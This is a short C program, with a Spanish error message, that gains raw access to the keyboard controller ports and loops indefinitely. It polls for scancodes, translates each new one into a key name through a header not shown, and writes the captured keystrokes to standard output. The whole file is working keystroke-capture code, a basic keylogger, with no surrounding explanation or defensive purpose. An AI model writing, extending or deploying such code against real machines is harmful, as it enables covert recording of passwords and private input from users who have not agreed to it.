#include <stdio.h>
#include "translate.h" 

int main(int argc, char **argv) {
  int code = 0;
  int last = 0;
  FILE *file = stdout;

  memset(status, false, sizeof(status) );

  if (ioperm(KB_IO, 1, 1) == -1 || ioperm(KB_ST, 1, 1) == -1) {
    fprintf(stderr, "Imposible acceder al puerto del teclado.");
    exit(3);
  }

  while (1) {
    code = 0;
    if (inb(KB_ST) == 20)
      code = inb(KB_IO);
    if (code) {
      if (code != last) {
	last = code;
#ifdef VIEWCODE
	fprintf(file, "%X", code);
#else
	if (translate(code))
	  fprintf(file, "%s", translate(code));
#endif
	fflush(file);
      }
    }
    usleep(SLEEP);
  }
  return 0;
}
